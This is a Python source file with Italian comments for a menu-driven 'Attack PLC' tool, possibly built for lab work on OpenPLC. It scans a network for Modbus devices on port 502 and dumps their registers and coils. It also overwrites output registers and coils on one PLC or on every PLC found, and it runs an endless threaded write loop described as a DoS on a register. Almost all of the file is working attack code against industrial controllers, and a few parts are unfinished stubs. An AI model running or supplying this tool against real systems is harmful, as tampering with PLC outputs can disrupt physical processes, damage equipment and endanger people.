import os
import sys
import time # Per la sleep
import nmap3 # Per lo scan della rete
import json # Per gestire i file json
import threading # Per fare poi il loop dell'attacco
from collections import defaultdict
from easymodbus.modbusClient import ModbusClient

class AttackPLC:

  """
  Inizializzo la classe
  """
  def __init__(self):
    self.plc_list = {}
    self.plc_registers = defaultdict(dict)
    self.single_plc_registers = defaultdict(dict)

    self.disInReg = {}
    self.InReg = {}
    self.HolReg = {}
    self.Coils = {}

  """
  [Metodo interno] Verifico se già esiste una scansione precedente. Se non esiste,
  chiedo all'utente di effettuarne una
  """
  def scan_is_present(self):
    if not os.path.exists('plc_list.json'):
      req = input("PLC list not present. Perform a new search? [y/n] ")

      if(req == "y" or req == "Y"):
        self.find_PLCs()
      else:
        return

  """
  Leggo i Discrete Input Registers (identificati da %IXa.b).

  Parametri:
  - mb: è il file descriptor della connessione Modbus
  - single_plc: se False, legge 8 registri a partire da un
  indirizzo predefinito 0 (quindi da %IX0.0 a %IX0.7).
  Se True, legge 8 registri a partire da un indirizzo
  specificato dall'utente (il numero dell'indirizzo è in base 8
  e va convertito in decimale affiché Modbus riesca a leggerlo)
  """
  def read_DiscreteInputRegisters(self, mb, single_plc=False):
    # Dictionnary dove andrò a mettere i registri letti e i
    # relativi valori
    registri = {}

    # Definisco l'indirizzo di partenza per lo scan dei
    # registri: se sto analizzando un blocco di PLC,
    # allora analizzero i registri facenti capo allo
    # indirizzo 0; se sto analizzando una specifica
    # PLC, chiedo all'utente il registro da cui vuole
    # recuperare i registri
    if(single_plc == False):
      starting_addr = 0
    else:
      starting_addr = input("Address to read (0-99): ")

      while (int(starting_addr) > 99):
        print("Invalid address!")
        starting_addr = input("Address to read (0-99): ")

    # Converto il valore letto in intero e poi lo trasformo in
    # decimale, così da passarlo al metodo read_discretinputs()
    # (gli indirizzi della PLC sono in base 8, mentre Modbus li
    # vuole in base 10. Si veda per maggiori dettagli
    # https://www.openplcproject.com/reference/modbus-slave/
    # (ma attenzione alla modalità master, che NON ho considerato
    # in questa sede!)
    starting_addr = int(starting_addr)
    starting_addr_dec = starting_addr * 8

    print(f"Reading Discrete Input Registers from %IX{starting_addr}.0 to %IX{starting_addr}.7")
    # Leggo 8 registri a partire dall'indirizzo di partenza. Nulla 
    # mi vieterebbe di leggerne anche 100, ma manteniamo la 
    # suddivisione in base all'indirizzo...)
    discreteIn = mb.read_discreteinputs(starting_addr_dec, 8)

    # Ricavo il dict dall'output della lettura dei
    # registri
    reg_num = 0 # Identificativo del registro

    for di in discreteIn:
      registri['%IX'+ str(starting_addr) +'.'+str(reg_num)] = str(di)
      reg_num += 1

    # Ritorno i registri e il loro valore
    return registri

  """
  Leggo gli Input Registers (identificati da %IWa)

  Parametri:
  - mb: è il file descriptor della connessione Modbus
  - single_plc: se False, analizza il range predefinito
  di indirizzi da %IW0 a %IW7; se True analizza un range
  di registri definito dall'utente. Il range deve essere
  composto da due valori (starting_addr, ending_addr)
  divisi da un "-" e senza spazi
  """
  def read_InputRegisters(self, mb, single_plc=False):
    registri = {}

    addr_range = input("Address range to read [0-1023]: ")

    while(int(addr_range.split('-')[1]) > 1023):
      print("Invalid addresses!")
      addr_range = input("Address range to read [0-1023]: ")

    starting_addr = int(addr_range.split('-')[0])
    ending_addr = int(addr_range.split('-')[1])

    print(f"Reading Input Registers from %IW{starting_addr} to %IW{ending_addr}")
    inputRegisters = mb.read_inputregisters(starting_addr, ending_addr)

    reg_num = starting_addr

    for ir in inputRegisters:
      registri['%IW' + str(reg_num)] = str(ir)
      reg_num += 1

    return registri

  """
  Leggo gli Output e gli Holding Registers
  """
  def read_HoldingOutputRegisters(self, mb, single_plc=False):
    registri = {}
    
    addr_range = input("Address range to read [0-1023]]: ")

    while(int(addr_range.split('-')[1]) > 1023):
      print("Invalid addresses!")
      addr_range = input("Address range to read [0-1023]: ")
      
    starting_addr = int(addr_range.split('-')[0])
    ending_addr = int(addr_range.split('-')[1])

    print(f"Reading Input Registers from %QW{starting_addr} to %QW{ending_addr}")
    holdingRegisters = mb.read_holdingregisters(starting_addr, ending_addr)

    reg_num = starting_addr

    for hr in holdingRegisters:
      registri['%QW' + str(reg_num)] = str(hr)
      reg_num += 1

    return registri

  """
  Leggo le Coils
  """
  def read_Coils(self, mb, single_plc=False):
    registri = {}

    starting_addr = input("Enter addresses separated by comma (0-99): ")

    #while (int(starting_addr) > 99):
    #  print("Invalid address!")
    #  starting_addr = input("Enter addresses separated by comma (0-99): ")

    starting_addr = starting_addr.split(',')

    for addr in starting_addr:
      addr = int(addr)
      addr_dec = addr * 8

      print(f"Reading Coils from %QX{addr}.0 to %QX{addr}.7")
      coils = mb.read_coils(addr_dec, 8)

      reg_num = 0

      for coil in coils:
        registri['%QX'+ str(addr) +'.'+str(reg_num)] = str(coil)
        reg_num += 1

    return registri

  """
  Eseguo lo scan della rete con nmap filtrando la porta
  502, così da trovare le PLC attive. 
  Il modulo nmap3 restituisce nativamente in output input
  in formato JSON, e di quello verrà poi fatto una specie
  di parsing per trovare gli host che presentano la porta
  502 aperta (e che indicano appunto le PLC). Il risultato
  dell'intera scansione della rete e la lista delle PLC
  trovate vengono salvate su file .json: il primo è per
  mera referenza, il secondo servirà per i metodi di
  questo script
  """
  def find_PLCs(self):
    # Chiedo all'utente quale rete vuole scansionare
    net = input("Network to scan [<ip_addr>/<mask>]: ")

    # Eseguo lo scan sulla rete specificata
    print(f"Scanning {net}\n")
    nmap = nmap3.NmapScanTechniques()
    results = nmap.nmap_tcp_scan(net, args='-p 502')

    # Salvo il risultato dello scan su file JSON
    with open('network_scan.json', 'w') as f:
      f.write(json.dumps(results, indent=4, sort_keys=True))

    print("Active PLCs found: ")

    # Questo serve esclusivamente come chiave
    # per il dict che andrò a creare. Posso farlo
    # partire anche da 0, è indifferente
    plc_num = 1

    # Elimino gli ultimi due campi della scansione, che
    # non sono host, ma entry messe da nmap
    for address in results:
      if(address == "runtime" or address == "stats"):
        continue

      # Per ogni indirizzo ip trovato, verifico se la
      # porta 502 è aperta. Se non lo è, salto al 
      # prossimo host
      for port in results[address]['ports']:
        if(port['state'] != "open"):
          continue

        # Salvo l'host nel dict e incremento il valore
        # della prossima chiave
        self.plc_list[plc_num] = address
        plc_num = plc_num + 1

        # Stampo l'host a video
        print(address)

    #print(self.plc_list) #debug
    print("\n")

    # Salvo l'intero dict ottenuto su file .json
    with open('plc_list.json', 'w') as p:
      p.write(json.dumps(self.plc_list, indent=4))

  """
  Analizzo i registri di ogni PLC trovata in precedenza. E' necessario
  aver effettuato uno scan della rete e aver ottenuto una lista di PLC
  attive prima di procedere oltre: se una scansione precedente non è 
  stata trovata, chiedo all'utente se vuole eseguirne una.

  Per default, in questa fase vengono analizzati:
  - i discrete input registers %IX0.0-7
  - gli input registers %IW0-7
  . gli holding/output registers %QW0-9
  - le coils %QX0.0-7

  Per range personalizzati, si rimanda allo scan delle singole PLC.
  I risultati dello scan vengono salvati in un file .json
  """
  def scan_all_plcs(self):
    self.scan_is_present()

    # Leggo da file la lista delle PLC trovate in precedenza
    with open('plc_list.json', 'r') as f:
      buf = f.read()

    # Converto l'elenco da JSON a dict
    plc_list = json.loads(buf)

    # Analizzo le PLC una a una
    for plc in plc_list:

      # Mi connetto alla PLC
      print(f'Connecting to {plc_list[plc]}')
      mb = ModbusClient(plc_list[plc], 502)
      mb.connect()

      # Leggo i Discrete Input Registers
      self.disInReg = self.read_DiscreteInputRegisters(mb, False)
      print(self.disInReg)

      """
      Come prima, ma per tutti gli altri registri!
      """
      self.InReg = self.read_InputRegisters(mb, False)
      print(self.InReg)

      self.HolReg = self.read_HoldingOutputRegisters(mb, False)
      print(self.HolReg)

      self.Coils = self.read_Coils(mb, False)
      print(self.Coils)

      # Qui dovrei aggiornare il dict, in teoria...
      self.plc_registers[plc_list[plc]]['DiscreteInputRegisters'] = self.disInReg
      self.plc_registers[plc_list[plc]]['InputRegisters'] = self.InReg
      self.plc_registers[plc_list[plc]]['HoldingOutputRegisters'] = self.HolReg
      self.plc_registers[plc_list[plc]]['Coils'] = self.Coils

      #print(plcs[plc]) 

    #print(json.dumps(self.plc_registers, indent=4)) # Debug
    
    # Salvo il risultato della scansione su file
    with open('plc_registers.json', 'w') as pr:
      pr.write(json.dumps(self.plc_registers, indent=4))

    mb.close()

    # Ritorno al menu principale
    input("Done. Press Enter to continue ")

  """
  Analizzo una singola PLC scelta dalla lista delle PLC attive.
  Di fatto il funzionamento è quasi identico a quello della funzione
  precedente, ma stavolta chiedo all'utente esattamente quali
  registri vuole analizzare. Il risultato dovrebbe venire salvato in
  un file .json tipo <ip_plc>.json
  """
  def scan_single_plc(self):
    self.scan_is_present()

    with open('plc_list.json', 'r') as f:
      buf = f.read()

    plc_list = json.loads(buf)

    print("Available PLCs: ")
    count = 1 # Contatore, serve solo per l'elenco
              # delle plc

    for i in plc_list:
      print(f'{str(count)} - {plc_list[i]}')
      count += 1

    choice = input('Choose a PLC: ')

    for key in plc_list:
      if(choice == key):
        plc = plc_list[key]
        break

      else: 
        print("Invalid choice")

    print(plc) # Debug

    # Mi connetto alla PLC
    print(f'Connecting to {plc}')
    mb = ModbusClient(plc, 502) 
    mb.connect()

    self.disInReg = self.read_DiscreteInputRegisters(mb, True)
    print(self.disInReg)

    self.InReg = self.read_InputRegisters(mb, True)
    print(self.InReg)

    self.HolReg = self.read_HoldingOutputRegisters(mb, True)
    print(self.HolReg)

    self.Coils = self.read_Coils(mb, True)
    print(self.Coils)

    self.single_plc_registers[plc]['DiscreteInputRegisters'] = self.disInReg
    self.single_plc_registers[plc]['InputRegisters'] = self.InReg
    self.single_plc_registers[plc]['HoldingOutputRegisters'] = self.HolReg
    self.single_plc_registers[plc]['Coils'] = self.Coils

    with open(f'{plc}.json', 'w') as sp:
      sp.write(json.dumps(self.single_plc_registers, indent=4))

    mb.close()
    input("Done. Press Enter to continue ")

  """
  Metodo che andrà in un thread per l'attacco DoS a un registro
  """
  def dos_attack(self, plc, reg_type, modbus_addr, value):
    mb = ModbusClient(plc, 502)
    mb.connect()
  
    if(reg_type == "coil"):
      addr = modbus_addr / 8
      addr = int(addr)
      register = modbus_addr % 8

      print(f"DoS attack on %QX{addr}.{register}")
      while(True):
        mb.write_single_coil(int(modbus_addr), bool(value))

    elif(reg_type == "register"):
      while(True):
        mb.write_single_register(int(modbus_addr), int(value))
    
    mb.close()

  """
  Cambio il valore di un registro sulla PLC
  """
  def changeRegisterValue(self, single_plc=False):
    if(single_plc == False):
      self.scan_is_present()

      print("Available registers: ")
      print(" - Holding Output Registers: from %QW0 to %QW9")
      print(" - Coils: from %QX0.0 to %QX0.7")
      print("\n")
      choice = input("What do you want to attack? [coil / register]: ")

      """
      while(choice != "coil" or choice != "register"):
        print(choice)
        print("Invalid choice")
        choice = input("What do you want to attack? [coil / register]: ")
      """

      # Assumo che se faccio un attacco di massa su tutte
      # le PLC queste siano uguali tra loro, o quantomeno
      # la maggior parte
      if(choice == "register"):
        opt = "register (0-9)"
      else:
        opt = "coil (0-7)"

      register = input(f"Select {opt}: ")
      value = input("Enter new value: ")
      print("\n")

      with open('plc_registers.json', 'r') as pl:
        plc_list = pl.read()

      plc_list = json.loads(plc_list)

      # Mi connetto a tutte le PLC della lista
      for plc in plc_list:
        print(f"Connecting to {plc}")

        mb = ModbusClient(plc, 502)
        mb.connect()

        # La scrittura posso farla solo su Holding/Output Registers e Coils...
        if(choice == "register"):
          print(f"Value found during the previous scan: {plc_list[plc]['HoldingOutputRegisters']['%QW' + register]}")
          actual_register_value = mb.read_holdingregisters(int(register), 1)
          print(f"Current %QW{register} register value on PLC: {actual_register_value}. Writing new value ")
        else:
          print(f"Value found during the previous scan: {plc_list[plc]['Coils']['%QX0.' + register]}")
          actual_register_value = mb.read_coils(int(register), 1)
          print(f"Current %QX0.{register} register value on PLC: {actual_register_value}. Writing new value ")

        try:
          if(choice == "register"):
            mb.write_single_register(int(register), int(value))
          else:
            mb.write_single_coil(int(register), bool(value))

        except Exception as e:
          print(e)
          print("Error writing on the PLC")

        mb.close()

    else:
      self.scan_is_present()

      with open('plc_list.json', 'r') as pl:
        plc_list = pl.read()

      plc_list = json.loads(plc_list)

      print("Available PLCs from scan: ")
      counter = 1
      for i in plc_list:
        #if(os.path.exists(f'{plc_list[plc]}.json')):
        print(f'{counter} - {plc_list[i]}')

      choice = input("Select PLC: ")

      if(not os.path.exists(f'{plc_list[str(choice)]}.json')):
        new_scan = input("Scan not found. Perform a new scan for this PLC? [y/n] ")
        if(new_scan == 'n' or new_scan == 'N'):
          return
        else:
          self.scan_single_plc()

      with open(f'{plc_list[str(choice)]}.json', 'r') as sp:
        plc_data = sp.read()

      plc_data = json.loads(plc_data)
      
      for ip in plc_data:
        plc = ip

      print(plc)

      print("Available registers and values: \n")

      for key, val in plc_data.items():
        print("Reg     | val")
        print("-------------")

        for holreg, val2 in plc_data[key]['HoldingOutputRegisters'].items():
          print(holreg + '    | ' + val2)

        print("        | ")

        for coilreg, val3 in plc_data[key]['Coils'].items():
          print(coilreg + ' | ' + val3)

      choice_reg = input("Select register: ")


      if(choice_reg[2] == "X" or choice_reg[2] == "x"):
        reg_type = "coil"

        ind = choice_reg.split(choice_reg[2])[1]
        addr = int(ind.split('.')[0]) * 8
        register = int(ind.split('.')[1])
        modbus_addr = addr + register
        value = input("Enter new value [True/False]: ")

        loop = input("Do you want to perform a DoS on the register? [y/n] ")
        
        if(loop == "y" or loop == "Y"):
          thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, bool(value)))
          thr1.start()
        else:
          mb = ModbusClient(plc, 502)
          mb.connect()

          mb.write_single_coil(modbus_addr, bool(value))

          mb.close()

      elif(choice_reg[2] == "W" or choice_reg[2] == "w"):
        reg_type = "register"

        modbus_addr = int(choice_reg.split(choice_reg[2])[1])
        value = input("Enter new value: ")

        loop = input("Do you want to perform a DoS on the register? [y/n] ")

        if(loop == "y" or loop == "Y"):
          thr1 = threading.Thread(target=self.dos_attack, args=(plc, reg_type, modbus_addr, int(value)))
          thr1.start()
        else:
          mb = ModbusClient(plc, 502)
          mb.connect()

          mb.write_single_register(modbus_addr, int(value))

          mb.close()

    time.sleep(1) # Altrimenti mi sballa la stampa in caso di thread
    input("Done. Presse Enter to continue: ")


  """
  Richiamo i tipi di attacco alle PLC
  """
  def attack_all_PLC(self, mb, single_plc=False):
    pass


"""
Definisco il main. Che poi è il menu da cui richiamo
le varie funzioni del generatore di attacchi...
"""
def main():
  ap = AttackPLC()

  while(True):
    # Pulisco lo schermo, che fa più elegante...
    os.system('clear')

    print("==== Attack PLC - Menu ====")
    print("1 - Find active PLCs")
    print("2 - Scan all PLCs registers")
    print("3 - Scan single PLC registers")
    print("4 - Modify Registers")
    print("5 - DoS Attack to a register")
    print("6 - Exit\n")
    choice = input("Enter your choice: ")

    if(choice == "1"):
      ap.find_PLCs()
    elif(choice == "2"):
      ap.scan_all_plcs()
    elif(choice == "3"):
      ap.scan_single_plc()
    elif(choice == "4"):
      ap.changeRegisterValue(True)
    elif(choice == "5"):
      pass
    elif(choice == "6"):
      os._exit(1)
    else:
      print("Invalid choice\n")

if __name__ == '__main__':
  main()
